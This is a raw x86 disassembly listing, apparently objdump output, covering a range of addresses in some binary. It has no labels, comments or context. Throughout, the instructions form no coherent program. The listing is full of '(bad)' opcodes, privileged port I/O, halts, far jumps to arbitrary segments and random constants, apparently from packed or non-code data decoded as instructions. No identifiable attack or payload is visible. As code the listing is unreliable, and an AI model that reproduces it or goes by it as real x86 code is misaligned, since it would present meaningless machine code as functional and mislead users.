  41db9b:	addr16 retf 0xf829
  41db9f:	fcomp  DWORD PTR ds:0x82790d0b
  41dba5:	aam    0xc1
  41dba7:	inc    edx
  41dba8:	cli    
  41dba9:	out    0x90,al
  41dbab:	nop
  41dbac:	cli    
  41dbad:	add    bl,bl
  41dbaf:	push   esi
  41dbb0:	push   esi
  41dbb1:	inc    ebp
  41dbb2:	cmp    DWORD PTR ds:0x2d6c241e,0xc65af8a5
  41dbbc:	xchg   DWORD PTR [edi-0x303ef49a],ebx
  41dbc2:	adc    esi,ecx
  41dbc4:	retf   
  41dbc5:	or     al,0x43
  41dbc7:	mov    dl,cl
  41dbc9:	jb     0x41db98
  41dbcb:	dec    edx
  41dbcc:	dec    ecx
  41dbcd:	enter  0x6572,0x2
  41dbd1:	jmp    DWORD PTR [eax-0x48]
  41dbd4:	cwde   
  41dbd5:	sbb    DWORD PTR [ecx-0x58],esi
  41dbd8:	mov    edi,0xf952a48
  41dbdd:	fs mov al,0x44
  41dbe0:	lods   eax,DWORD PTR ds:[esi]
  41dbe1:	jp     0x41dbf0
  41dbe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbe4:	mov    ecx,0x6b3b083d
  41dbe9:	daa    
  41dbea:	and    eax,0xf1d80a2d
  41dbef:	jae    0x41dbb0
  41dbf1:	dec    edx
  41dbf2:	test   BYTE PTR [esi-0xad8a9c1],ah
  41dbf8:	test   al,0xf8
  41dbfa:	cmp    DWORD PTR [esi],esi
  41dbfc:	jb     0x41dbdb
  41dbfe:	add    ch,BYTE PTR [edi]
  41dc00:	inc    edi
  41dc01:	sub    dh,BYTE PTR [edx+0x6d]
  41dc04:	sub    DWORD PTR [ecx+0x45],ebp
  41dc07:	fidivr DWORD PTR [edx]
  41dc09:	push   ds
  41dc0a:	shl    DWORD PTR [esi],0x37
  41dc0d:	fs loope 0x41dbf1
  41dc10:	or     ch,ch
  41dc12:	dec    DWORD PTR [eax]
  41dc14:	pushf  
  41dc15:	ins    DWORD PTR es:[edi],dx
  41dc16:	and    al,BYTE PTR [eax-0xf3c9111]
  41dc1c:	ja     0x41dc68
  41dc1e:	loop   0x41dbd0
  41dc20:	xchg   DWORD PTR [ebx+0x35e6706b],edx
  41dc26:	test   al,0x35
  41dc28:	rcr    BYTE PTR [ebx+0x1a],cl
  41dc2b:	imul   edi,DWORD PTR [edi],0x38
  41dc2e:	pop    edx
  41dc2f:	jecxz  0x41dca9
  41dc31:	pop    edi
  41dc32:	scas   al,BYTE PTR es:[edi]
  41dc33:	lods   al,BYTE PTR ds:[esi]
  41dc34:	out    dx,eax
  41dc35:	push   ds
  41dc36:	xchg   ebp,eax
  41dc37:	repz sub BYTE PTR [ecx],ch
  41dc3a:	xchg   esi,eax
  41dc3b:	mov    ecx,DWORD PTR [ebp+0x5d7e9df2]
  41dc41:	(bad)  
  41dc42:	or     dl,bh
  41dc44:	(bad)  
  41dc45:	jmp    0xd094f94b
  41dc4a:	jge    0x41dc36
  41dc4c:	cwde   
  41dc4d:	and    DWORD PTR [eax-0x6b],esp
  41dc50:	xchg   DWORD PTR [esi],esi
  41dc52:	sub    BYTE PTR [ebx],bh
  41dc54:	in     eax,0xd1
  41dc56:	mov    edi,0xe52ab714
  41dc5b:	push   ss
  41dc5c:	and    eax,0x3751e868
  41dc61:	jo     0x41dc00
  41dc63:	or     eax,0x157a8047
  41dc68:	in     eax,dx
  41dc69:	jnp    0x41dc33
  41dc6b:	cmc    
  41dc6c:	leave  
  41dc6d:	pop    es
  41dc6e:	or     eax,0xf46a56ff
  41dc73:	bound  eax,QWORD PTR [edx]
  41dc75:	mov    esi,0x8b3ea8cc
  41dc7a:	int3   
  41dc7b:	jno    0x41dce9
  41dc7d:	out    dx,al
  41dc7e:	stos   BYTE PTR es:[edi],al
  41dc7f:	fsubr  st(3),st
  41dc81:	je     0x41dc26
  41dc83:	sub    edi,DWORD PTR [eax-0x64]
  41dc86:	sub    BYTE PTR [ecx],bh
  41dc88:	test   BYTE PTR [ecx],ah
  41dc8a:	into   
  41dc8b:	cdq    
  41dc8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc8d:	imul   esi,DWORD PTR [ebx],0x24b09355
  41dc93:	sub    ecx,DWORD PTR [eax+0x2]
  41dc96:	pop    ebx
  41dc97:	add    BYTE PTR [edx+0x41c8a3b7],cl
  41dc9d:	push   ss
  41dc9e:	mov    dh,0x3a
  41dca0:	test   eax,0xad300d66
  41dca5:	rcl    BYTE PTR [edx],0x56
  41dca8:	sar    DWORD PTR [esp+edi*2],0x79
  41dcac:	xor    edi,DWORD PTR ds:0xc2fe9dbb
  41dcb2:	aad    0x7e
  41dcb4:	fs jnp 0x41dcab
  41dcb7:	pop    ds
  41dcb8:	shl    DWORD PTR [edi],cl
  41dcba:	add    DWORD PTR gs:[eax],edi
  41dcbd:	nop
  41dcbe:	fstp   DWORD PTR [ebp-0x11abc787]
  41dcc4:	out    0xca,al
  41dcc6:	fild   QWORD PTR [ebx]
  41dcc9:	nop
  41dcca:	js     0x41dc50
  41dccc:	adc    ebp,esp
  41dcce:	sub    ecx,ebx
  41dcd0:	shl    BYTE PTR [ebx-0x3f3261eb],1
  41dcd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcd7:	inc    ecx
  41dcd8:	adc    bl,bl
  41dcda:	inc    esi
  41dcdb:	mov    ah,0xf8
  41dcdd:	xlat   BYTE PTR ds:[ebx]
  41dcde:	shl    DWORD PTR [eax-0x41],0x82
  41dce2:	ss push ebx
  41dce4:	sub    eax,0x31cf742
  41dce9:	xor    ebx,DWORD PTR gs:[eax+esi*8+0x70]
  41dcee:	sub    eax,0xaeeb408
  41dcf3:	cdq    
  41dcf4:	pop    eax
  41dcf5:	stos   BYTE PTR es:[edi],al
  41dcf6:	xchg   edx,eax
  41dcf7:	std    
  41dcf8:	cmp    al,bl
  41dcfa:	sub    eax,DWORD PTR [esi]
  41dcfc:	cld    
  41dcfd:	stos   BYTE PTR es:[edi],al
  41dcfe:	mov    fs,WORD PTR [ebp-0x7634e7f0]
  41dd04:	cmp    esp,DWORD PTR [ecx+ebp*1]
  41dd07:	loopne 0x41dd57
  41dd09:	mov    BYTE PTR [ebx],ah
  41dd0b:	aas    
  41dd0c:	xor    edi,DWORD PTR [eax]
  41dd0e:	clc    
  41dd0f:	mov    esp,0xd84500e
  41dd14:	cld    
  41dd15:	and    al,0xff
  41dd17:	aas    
  41dd18:	rcr    cl,0x34
  41dd1b:	mov    WORD PTR [eax],fs
  41dd1d:	fiadd  DWORD PTR [edx+0x31]
  41dd20:	icebp  
  41dd21:	xchg   esp,eax
  41dd22:	inc    esp
  41dd23:	inc    BYTE PTR [ebp-0x2a]
  41dd26:	xor    BYTE PTR [ebp-0x46],ah
  41dd29:	icebp  
  41dd2a:	(bad)  
  41dd2b:	test   DWORD PTR [esi-0x18],ecx
  41dd2e:	loopne 0x41dcc7
  41dd30:	popf   
  41dd31:	lds    esi,FWORD PTR [eax]
  41dd33:	popf   
  41dd34:	xchg   ebx,eax
  41dd35:	stc    
  41dd36:	jne    0x41dce6
  41dd38:	js     0x41dcef
  41dd3a:	and    eax,0x4ecc192c
  41dd3f:	je     0x41dda5
  41dd41:	aam    0x3d
  41dd43:	push   esi
  41dd44:	and    al,0x5f
  41dd46:	mov    BYTE PTR [edx+eiz*8],al
  41dd49:	xchg   ebp,ebx
  41dd4b:	push   DWORD PTR [edx+0x3d737290]
  41dd51:	pop    ebp
  41dd52:	stc    
  41dd53:	xor    esp,DWORD PTR [edi-0xd]
  41dd56:	jo     0x41dcfd
  41dd58:	push   cs
  41dd59:	icebp  
  41dd5a:	sbb    edi,DWORD PTR [ecx-0x8]
  41dd5d:	out    0xd,al
  41dd5f:	sahf   
  41dd60:	sbb    eax,0xd6c0dff8
  41dd65:	bound  ebx,QWORD PTR [ebx]
  41dd67:	pusha  
  41dd68:	mov    bh,0x44
  41dd6a:	mov    BYTE PTR [edi-0x76b07f89],dh
  41dd70:	(bad)  
  41dd71:	out    0x68,al
  41dd73:	and    al,0x64
  41dd75:	sbb    DWORD PTR [edx-0x1],edi
  41dd78:	mov    dl,0x79
  41dd7a:	fbstp  TBYTE PTR gs:[eax+edx*4+0x38]
  41dd7f:	sub    DWORD PTR [eax+edi*2],ebx
  41dd82:	inc    esi
  41dd83:	add    esi,DWORD PTR [esi-0xbae90e3]
  41dd89:	xchg   esp,eax
  41dd8a:	aas    
  41dd8b:	jle    0x41dd6b
  41dd8d:	push   edx
  41dd8e:	and    DWORD PTR [ecx],edi
  41dd90:	mov    eax,DWORD PTR [eax+0x3c]
  41dd93:	stos   BYTE PTR es:[edi],al
  41dd94:	call   0x45548d88
  41dd99:	mov    esi,0x410e350d
  41dd9e:	test   eax,0x3e93bbc7
  41dda3:	jae    0x41de0c
  41dda5:	jnp    0x41dd60
  41dda7:	fnstenv [ebp+eiz*2+0x40a38c9b]
  41ddae:	jge    0x41dd5b
  41ddb0:	inc    eax
  41ddb1:	cwde   
  41ddb2:	leave  
  41ddb3:	(bad)  
  41ddb4:	addr16 or bl,dl
  41ddb7:	ret    
  41ddb8:	lds    esi,FWORD PTR [ebx]
  41ddba:	and    cl,BYTE PTR [ebx+0x21]
  41ddbd:	xchg   esi,eax
  41ddbe:	(bad)  
  41ddbf:	sub    BYTE PTR [ebx+ecx*8],dl
  41ddc2:	and    BYTE PTR [edx],dh
  41ddc4:	ins    DWORD PTR es:[edi],dx
  41ddc5:	or     eax,0x148ca422
  41ddca:	je     0x41dd56
  41ddcc:	je     0x41dd7f
  41ddce:	cld    
  41ddcf:	fnsave [edx-0x4049b4e5]
  41ddd5:	lods   eax,DWORD PTR ds:[esi]
  41ddd6:	fimul  WORD PTR cs:[edi+ebx*4-0x20f8d025]
  41ddde:	or     bl,ch
  41dde0:	cmp    cl,BYTE PTR [esi+0x10e99081]
  41dde6:	inc    esi
  41dde7:	pop    edx
  41dde8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dde9:	cmc    
  41ddea:	inc    edi
  41ddeb:	mov    al,0x53
  41dded:	(bad)  
  41ddee:	dec    esp
  41ddef:	inc    ebp
  41ddf0:	rol    DWORD PTR [ecx],1
  41ddf2:	mov    bh,0x54
  41ddf4:	(bad)  
  41ddf5:	fwait
  41ddf6:	mov    ah,0xd0
  41ddf8:	push   cx
  41ddfa:	(bad)  
  41ddfb:	shl    DWORD PTR [ebp-0x34],cl
  41ddfe:	add    DWORD PTR [ebp+0x4a2bf601],ecx
  41de04:	iret   
  41de05:	xchg   ebx,eax
  41de06:	and    BYTE PTR [edx-0x26de05a],bh
  41de0c:	jmp    0xf259d629
  41de11:	repz xor cl,dh
  41de14:	mov    eax,ds:0x69253044
  41de19:	mov    dl,ah
  41de1b:	add    BYTE PTR [eax],dl
  41de1d:	inc    ebx
  41de1e:	dec    eax
  41de1f:	in     al,dx
  41de20:	and    DWORD PTR [ebx+esi*2-0x6231d78e],edx
  41de27:	int    0xd7
  41de29:	cli    
  41de2a:	aad    0x3b
  41de2c:	loopne 0x41de12
  41de2e:	push   ecx
  41de2f:	out    dx,eax
  41de30:	arpl   WORD PTR [ebp-0x7f],cx
  41de33:	mov    BYTE PTR [edi+edi*4-0x53],ch
  41de37:	retf   0xfb82
  41de3a:	xchg   BYTE PTR [esi],al
  41de3c:	bound  ebx,QWORD PTR [esp+eax*2+0x7a]
  41de40:	and    ecx,DWORD PTR [ebx-0x24]
  41de43:	add    cl,BYTE PTR [edx-0x602dd582]
  41de49:	mov    edi,0x993d4d55
  41de4e:	pop    esi
  41de4f:	pop    ebp
  41de50:	jmp    0x78d42603
  41de55:	outs   dx,BYTE PTR ds:[esi]
  41de56:	or     dl,BYTE PTR [edx]
  41de58:	push   esi
  41de59:	mov    DWORD PTR [edx+0x65],eax
  41de5c:	ins    DWORD PTR es:[edi],dx
  41de5d:	clc    
  41de5e:	inc    edx
  41de5f:	cli    
  41de60:	jno    0x41de4c
  41de62:	lds    esi,FWORD PTR [edi-0x47]
  41de65:	sub    dl,BYTE PTR [ecx+0x3a]
  41de68:	int3   
  41de69:	stc    
  41de6a:	ret    0x77cc
  41de6d:	neg    DWORD PTR [edx+eiz*8+0x1e]
  41de71:	repz fnstenv [ebx]
  41de74:	aaa    
  41de75:	xchg   DWORD PTR [ebx],esp
  41de77:	out    dx,eax
  41de78:	push   esi
  41de79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de7a:	sbb    ch,BYTE PTR [esi+0x25]
  41de7d:	cdq    
  41de7e:	scas   al,BYTE PTR es:[edi]
  41de7f:	push   eax
  41de80:	sub    DWORD PTR [ebx+0x5a],0x36286d7
  41de87:	ds das 
  41de89:	repz fimul WORD PTR [edx]
  41de8c:	fisub  DWORD PTR [ebp+0x6903fde]
  41de92:	adc    bh,BYTE PTR [esp+ebp*8+0x73d0c07a]
  41de99:	bnd je 0x41de67
  41de9c:	sbb    eax,0xd02d882a
  41dea1:	jns    0x41de5a
  41dea3:	mov    ebp,0xd10f63af
  41dea8:	cwde   
  41dea9:	mov    ebx,0xad286975
  41deae:	xchg   esp,eax
  41deaf:	stc    
  41deb0:	nop
  41deb1:	cli    
  41deb2:	xchg   edx,eax
  41deb3:	xor    BYTE PTR [eax],ch
  41deb5:	jne    0x41df06
  41deb7:	jg     0x41de86
  41deb9:	test   DWORD PTR [eax-0x39],ebx
  41debc:	shr    bh,1
  41debe:	stos   DWORD PTR es:[edi],eax
  41debf:	adc    eax,0x46c22bed
  41dec4:	add    eax,0x75f5a242
  41dec9:	adc    eax,DWORD PTR [ebx-0x7c]
  41decc:	and    BYTE PTR [ebp+0x67],0xfc
  41ded0:	jo     0x41df37
  41ded2:	pop    esp
  41ded3:	mov    ecx,0xf2651df6
  41ded8:	push   edx
  41ded9:	dec    edi
  41deda:	ins    BYTE PTR es:[edi],dx
  41dedb:	mov    esp,0x9d
  41dee0:	add    BYTE PTR [eax],al
  41dee2:	loope  0x41de68
  41dee4:	xchg   al,dh
  41dee6:	out    0xf2,eax
  41dee8:	not    DWORD PTR [ebp-0x25c4ffdf]
  41deee:	mov    cl,0x72
  41def0:	shr    BYTE PTR [ecx+0x1a],cl
  41def3:	pop    edx
  41def4:	add    DWORD PTR [eax],eax
  41def6:	repz add al,0x0
  41def9:	add    BYTE PTR [ebp-0x3],dl
  41defc:	inc    edi
  41defd:	test   al,0x6c
  41deff:	pop    edx
  41df00:	dec    edi
  41df01:	push   esi
  41df02:	in     eax,0xac
  41df04:	jns    0x41ded0
  41df06:	sbb    al,0x4a
  41df08:	dec    esp
  41df09:	or     dl,BYTE PTR [eax]
  41df0b:	stos   DWORD PTR es:[edi],eax
  41df0c:	imul   ebp,DWORD PTR [esi+0x68737d8a],0xdb94a793
  41df16:	pop    eax
  41df17:	imul   ebx,DWORD PTR [ecx+ecx*2+0x5a],0x58071fe
  41df1f:	push   ebx
  41df20:	in     eax,0x92
  41df22:	jae    0x41dee9
  41df24:	mov    ebp,0x706e0124
  41df29:	jl     0x41df9a
  41df2b:	stos   BYTE PTR es:[edi],al
  41df2c:	mov    esi,0x386e5c38
  41df31:	(bad)  
  41df32:	repz fnstcw WORD PTR [ecx+0x3029fb3c]
  41df39:	(bad)  
  41df3b:	cdq    
  41df3c:	or     cl,BYTE PTR [ecx]
  41df3e:	mov    dl,0x2
  41df40:	fld    QWORD PTR [ebp+0x57cdf5c9]
  41df46:	icebp  
  41df47:	cs daa 
  41df49:	or     eax,DWORD PTR [esi-0x446aa667]
  41df4f:	inc    ecx
  41df50:	inc    edi
  41df51:	pop    edx
  41df52:	mov    ah,BYTE PTR [edi+edi*8+0x7e976276]
  41df59:	xlat   BYTE PTR ds:[ebx]
  41df5a:	add    al,0xa1
  41df5c:	retf   0x2e24
  41df5f:	es sbb eax,0x29d7bcbb
  41df65:	inc    eax
  41df66:	outs   dx,BYTE PTR ds:[esi]
  41df67:	pusha  
  41df68:	jno    0x41df22
  41df6a:	jmp    0x5d67:0xd6c50752
  41df71:	rcl    BYTE PTR [ecx],1
  41df73:	mov    ah,0x89
  41df75:	push   esi
  41df76:	mov    ebx,0x610c6db8
  41df7b:	inc    ecx
  41df7c:	xchg   bh,cl
  41df7e:	pop    edi
  41df7f:	cmp    DWORD PTR [ecx],ebx
  41df81:	jecxz  0x41dfb7
  41df83:	rcr    BYTE PTR ds:[ecx],1
  41df86:	pop    esp
  41df87:	adc    eax,ebx
  41df89:	(bad)  
  41df8a:	push   ds
  41df8b:	and    bh,BYTE PTR [ecx+0xa]
  41df8e:	into   
  41df8f:	push   edx
  41df90:	pop    edi
  41df91:	iret   
  41df92:	je     0x41dfbb
  41df94:	mov    bh,0xe5
  41df96:	dec    edi
  41df97:	es addr16 leave 
  41df9a:	xchg   esi,eax
  41df9b:	pop    edi
  41df9c:	jle    0x41df4a
  41df9e:	fimul  DWORD PTR ds:0x7fa3345e
  41dfa4:	jmp    0x40ad6b2d
  41dfa9:	dec    ecx
  41dfaa:	push   es
  41dfab:	hlt    
  41dfac:	pusha  
  41dfad:	les    edi,FWORD PTR [edi+ecx*4+0x780753fe]
  41dfb4:	iret   
  41dfb5:	cmp    ebx,0xffffffee
  41dfb8:	aas    
  41dfb9:	dec    edi
  41dfba:	gs and eax,0xe7fde4d3
  41dfc0:	mov    esi,0xa6e57bd3
  41dfc5:	mov    ebp,0x710099ea
  41dfca:	inc    esp
  41dfcb:	adc    DWORD PTR [ebx],esi
  41dfcd:	sub    eax,0x6e7d394a
  41dfd2:	xchg   ebp,eax
  41dfd3:	ss (bad) 
  41dfd5:	push   0x283da858
  41dfda:	stos   DWORD PTR es:[edi],eax
  41dfdb:	sub    bh,ah
  41dfdd:	adc    eax,0x82fce211
  41dfe2:	clc    
  41dfe3:	outs   dx,DWORD PTR ds:[esi]
  41dfe4:	inc    ecx
  41dfe5:	cwde   
  41dfe6:	inc    esp
  41dfe7:	fwait
  41dfe8:	xchg   edx,eax
  41dfe9:	sti    
  41dfea:	inc    ebp
  41dfeb:	outs   dx,DWORD PTR ds:[esi]
  41dfec:	add    BYTE PTR [esi+0x520505f1],dl
  41dff2:	sub    DWORD PTR [ebx+0x24276354],0xc8a878c4
  41dffc:	jnp    0x41df86
  41dffe:	push   edx
  41dfff:	call   0xbf72:0xf18668a7
  41e006:	into   
  41e007:	xchg   edi,eax
  41e008:	out    dx,eax
  41e009:	popf   
  41e00a:	dec    edi
  41e00b:	and    eax,0x5ebdaf4a
  41e010:	ins    BYTE PTR es:[edi],dx
  41e011:	jge    0x41dfe0
  41e013:	inc    ebp
  41e014:	sbb    DWORD PTR [ebp-0x5828125e],esp
  41e01a:	adc    BYTE PTR [ebp+0x19],bl
  41e01d:	jecxz  0x41e08d
  41e01f:	mov    dl,BYTE PTR [ecx-0x1129002]
  41e025:	pop    edx
  41e026:	mov    WORD PTR [esi+0x7f],cs
  41e029:	mov    esp,0xfa181d73
  41e02e:	jb     0x41dfb6
  41e030:	or     eax,0x7c39c579
  41e035:	(bad)  
  41e036:	js     0x41e09e
  41e038:	sbb    al,0xfd
  41e03a:	dec    ecx
  41e03b:	mov    eax,ds:0xf2a69acf
  41e040:	fsub   DWORD PTR [edx-0x4b83fe5d]
  41e046:	lock into 
  41e048:	mov    ds:0x9375e25c,al
  41e04d:	int3   
  41e04e:	push   0x4b
  41e050:	add    dh,bl
  41e052:	shr    BYTE PTR [edi+0x4f],0x4e
  41e056:	(bad)  
  41e057:	mov    ecx,0xf6f8fa42
  41e05c:	sbb    eax,0x710194f8
  41e061:	inc    edi
  41e062:	(bad)  
  41e063:	cli    
  41e064:	or     BYTE PTR [eax-0x37],0x2d
  41e068:	mov    ch,0x46
  41e06a:	scas   al,BYTE PTR es:[edi]
  41e06b:	xchg   ebx,eax
  41e06c:	out    dx,eax
  41e06d:	mov    esi,es
  41e06f:	mov    esp,0x36577c59
  41e074:	test   DWORD PTR [ecx-0x5d],ebx
  41e077:	cdq    
  41e078:	mov    ecx,0xbc1135de
  41e07d:	hlt    
  41e07e:	inc    edi
  41e07f:	imul   esp,DWORD PTR [ebx+0x49],0xc
  41e083:	and    DWORD PTR [edi],esp
  41e085:	in     al,dx
  41e086:	push   ss
  41e087:	lahf   
  41e088:	xchg   edx,eax
  41e089:	push   ebx
  41e08a:	sbb    esi,DWORD PTR [eax]
  41e08c:	std    
  41e08d:	das    
  41e08e:	adc    al,0x91
  41e090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e091:	sti    
  41e092:	sub    DWORD PTR [ebx-0x2a76094c],edi
  41e098:	loop   0x41e035
  41e09a:	jg     0x41e05d
  41e09c:	inc    esp
  41e09d:	nop
  41e09e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e09f:	stc    
  41e0a0:	push   ebx
  41e0a1:	or     dl,BYTE PTR [ebp-0x1f]
  41e0a4:	sbb    eax,0x586194f1
  41e0a9:	pop    ebx
  41e0aa:	push   cs
  41e0ab:	add    edx,0xffffffb1
  41e0ae:	cmp    DWORD PTR [ecx+0x606375b6],ebp
  41e0b4:	add    ah,BYTE PTR [ecx-0x24]
  41e0b7:	ret    
  41e0b8:	leave  
  41e0b9:	mov    eax,0x593f2ecf
  41e0be:	cmp    al,dl
  41e0c0:	dec    ebp
  41e0c1:	retf   
  41e0c2:	jl     0x41e081
  41e0c4:	dec    ecx
  41e0c5:	int3   
  41e0c6:	inc    esp
  41e0c7:	fiadd  WORD PTR [eax+eax*4+0x79]
  41e0cb:	(bad)  [esi+eax*1+0x7f71db92]
  41e0d2:	aas    
  41e0d3:	call   0x1f78:0xdd23d8b1
  41e0da:	in     al,dx
  41e0db:	loope  0x41e11e
  41e0dd:	stc    
  41e0de:	or     bl,ah
  41e0e0:	fistp  WORD PTR [esi-0x4b]
  41e0e3:	pop    edx
  41e0e4:	cmp    eax,0x5ba3c4ac
  41e0e9:	ret    
  41e0ea:	loopne 0x41e097
  41e0ec:	test   eax,0x5cd9669b
  41e0f1:	outs   dx,BYTE PTR ds:[esi]
  41e0f2:	rol    BYTE PTR [esi-0x3213bab3],0xc7
  41e0f9:	and    al,0x1f
  41e0fb:	pop    edx
  41e0fc:	lods   eax,DWORD PTR ds:[esi]
  41e0fd:	retf   
  41e0fe:	jg     0x41e0cb
  41e100:	or     DWORD PTR [esi+0x1ebb1df3],eax
  41e106:	popa   
  41e107:	cmp    al,0xaa
  41e109:	dec    eax
  41e10a:	clc    
  41e10b:	or     ch,dh
  41e10d:	sub    eax,0x60a136b1
  41e112:	test   bl,0x70
  41e115:	cld    
  41e116:	mov    esp,0xbada2f98
  41e11b:	shr    DWORD PTR [eax+0x7f],0xb
  41e11f:	mov    ds:0x804ad6f0,al
  41e124:	xchg   ebp,eax
  41e125:	ror    DWORD PTR [eax+0x66],1
  41e128:	push   ds
  41e129:	add    bh,0x7b
  41e12c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e12d:	and    dh,bh
  41e12f:	sbb    al,0x10
  41e131:	push   edx
  41e132:	inc    ebp
  41e133:	push   esi
  41e134:	dec    edx
  41e135:	(bad)  
  41e136:	dec    edi
  41e137:	dec    esp
  41e138:	ficomp WORD PTR [edx+0x8]
  41e13b:	push   edx
  41e13c:	ds add eax,0x353582b8
  41e142:	cs push 0xa6092167
  41e148:	lods   eax,DWORD PTR ds:[esi]
  41e149:	fcomip st,st(6)
  41e14b:	cmp    BYTE PTR [ecx],cl
  41e14d:	sti    
  41e14e:	loop   0x41e15e
  41e150:	mov    DWORD PTR [ecx],esp
  41e152:	mov    bh,0xf2
  41e154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e155:	mov    ebx,0xfa93d43a
  41e15a:	out    0x32,eax
  41e15c:	mov    bh,BYTE PTR [ebx+0x2a764be7]
  41e162:	and    eax,0xb36c9d4a
  41e167:	cmp    bh,BYTE PTR [ebp-0x14bef5bb]
  41e16d:	add    bl,BYTE PTR [esi]
  41e16f:	imul   edx,DWORD PTR [edx],0xffffff80
  41e172:	xor    al,0x17
  41e174:	mov    ebp,0xcfff7dd7
  41e179:	push   es
  41e17a:	sub    BYTE PTR es:[ecx+0x25],cl
  41e17e:	sub    dl,ah
  41e180:	in     al,0xff
  41e182:	mov    edx,0xb6330429
  41e187:	inc    edi
  41e188:	out    dx,al
  41e189:	cli    
  41e18a:	cld    
  41e18b:	jns    0x41e1e7
  41e18d:	scas   al,BYTE PTR es:[edi]
  41e18e:	jmp    0xee7f1a96
  41e193:	mov    WORD PTR [eax-0x570c765a],es
  41e199:	and    BYTE PTR [edx+eiz*4],ah
  41e19c:	mov    al,ds:0xe689f62e
  41e1a1:	cmp    eax,0x7e6fed62
  41e1a6:	mov    edi,0xecfaad03
  41e1ab:	lods   eax,DWORD PTR ds:[esi]
  41e1ac:	popa   
  41e1ad:	push   edx
  41e1ae:	out    dx,al
  41e1af:	push   edi
  41e1b0:	inc    eax
  41e1b1:	pop    ecx
  41e1b2:	push   0x29
  41e1b4:	repz push 0x77
  41e1b7:	add    al,0x0
  41e1b9:	neg    BYTE PTR [esi-0x80]
  41e1bc:	lock xor dl,bl
  41e1bf:	retf   
  41e1c0:	cmp    eax,0x1f018599
  41e1c5:	mov    ebp,0xdcceaebd
  41e1ca:	push   ecx
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	addr16 je 0x41e215
  41e1cf:	jmp    0x41e16d
  41e1d1:	fwait
  41e1d2:	inc    ecx
  41e1d3:	add    bl,BYTE PTR [edx]
  41e1d5:	sub    bl,BYTE PTR ss:[ebx+0x66]
  41e1d9:	test   eax,0xfe6536ee
  41e1de:	hlt    
  41e1df:	lds    edi,FWORD PTR ds:0xdd997f30
  41e1e5:	push   ds
  41e1e6:	es pop edi
  41e1e8:	loope  0x41e179
  41e1ea:	mov    dl,0x48
  41e1ec:	and    bh,al
  41e1ee:	push   ss
  41e1ef:	std    
  41e1f0:	rol    DWORD PTR [esi],cl
  41e1f2:	cmp    DWORD PTR [eax],0x1a
  41e1f5:	sub    al,0x30
  41e1f7:	ficom  DWORD PTR [ebp-0x7497406b]
  41e1fd:	imul   ebx,DWORD PTR [ebp-0x2c776594],0xfc715fea
  41e207:	int    0x51
  41e209:	pop    ds
  41e20a:	adc    BYTE PTR [esi],dl
  41e20c:	xor    DWORD PTR [ebp+0x43],ebx
  41e20f:	cwde   
  41e210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e211:	push   ecx
  41e212:	ins    DWORD PTR es:[edi],dx
  41e213:	adc    DWORD PTR [eax-0x775fa215],edx
  41e219:	repz ror DWORD PTR [ebx-0x37],1
  41e21d:	jmp    0x9fa2eb28
  41e222:	push   esi
  41e223:	gs fxch st(3)
  41e226:	ds inc eax
  41e228:	outs   dx,DWORD PTR ds:[esi]
  41e229:	je     0x41e246
  41e22b:	(bad)  
  41e22d:	sub    al,0x58
  41e22f:	push   ds
  41e230:	scas   eax,DWORD PTR es:[edi]
  41e231:	xchg   ecx,eax
  41e232:	loope  0x41e2a8
  41e234:	arpl   WORD PTR ds:0x1b67e9a9,sp
  41e23a:	fild   WORD PTR ds:0xf6c76f6
  41e240:	in     eax,0xa6
  41e242:	sbb    dh,0xd9
  41e245:	sbb    ah,BYTE PTR [edi-0x3bb465ef]
  41e24b:	pop    eax
  41e24c:	add    BYTE PTR [edi+0x3efdaa63],dl
  41e252:	into   
  41e253:	mov    ah,0x23
  41e255:	pop    es
  41e256:	retf   0x3d44
  41e259:	pop    ecx
  41e25a:	or     al,0x41
  41e25c:	cmp    ebx,esp
  41e25e:	jl     0x41e298
  41e260:	jecxz  0x41e23a
  41e262:	and    al,0xc0
  41e264:	or     al,0x9a
  41e266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e267:	mov    DWORD PTR [eax+0x53],esp
  41e26a:	sbb    dh,0x25
  41e26d:	fmul   DWORD PTR [eax-0x44]
  41e270:	mov    esp,0xe2d185b0
  41e275:	(bad)  
  41e276:	mov    ds:0x4cf43d8d,eax
  41e27b:	ds sub al,0x1b
  41e27e:	adc    al,BYTE PTR [esi+eax*4-0x3af99c23]
  41e285:	ret    
  41e286:	mov    BYTE PTR ds:0x79afd41d,0x24
  41e28d:	and    edx,eax
  41e28f:	and    ebx,0x6
  41e292:	mov    ebx,0xd8bca333
  41e297:	std    
  41e298:	ins    BYTE PTR es:[edi],dx
  41e299:	or     eax,0xa8c48948
  41e29e:	pop    es
  41e29f:	pop    es
  41e2a0:	(bad)  
  41e2a1:	gs jle 0x41e2e1
  41e2a4:	call   0xe316b8f9
  41e2a9:	stos   BYTE PTR es:[edi],al
  41e2aa:	xor    DWORD PTR [eax-0x241731],edx
  41e2b0:	fidivr WORD PTR [eax-0x4e]
  41e2b3:	xor    eax,eax
  41e2b5:	sar    BYTE PTR [eax+0x3164c71e],1
  41e2bb:	sub    bh,ah
  41e2bd:	dec    edi
  41e2be:	push   ecx
  41e2bf:	imul   ecx,DWORD PTR [ecx],0xffffffce
  41e2c2:	je     0x41e2ea
  41e2c4:	cs and eax,0x3a4d8036
  41e2ca:	rcl    BYTE PTR [eax+0x1f],cl
  41e2cd:	jl     0x41e2c0
  41e2cf:	sti    
  41e2d0:	mov    dh,0x5b
  41e2d2:	xor    DWORD PTR ds:0xd27c8f80,esp
  41e2d8:	inc    ecx
  41e2d9:	mov    DWORD PTR [esi-0x220901d5],ebp
  41e2df:	fcomp  DWORD PTR [ebx+edx*1]
  41e2e2:	sar    BYTE PTR [eax+eax*4+0x14b24c17],1
  41e2e9:	sub    DWORD PTR cs:0xeef18c9f,edx
  41e2f0:	fidivr WORD PTR [eax-0x40]
  41e2f3:	push   esp
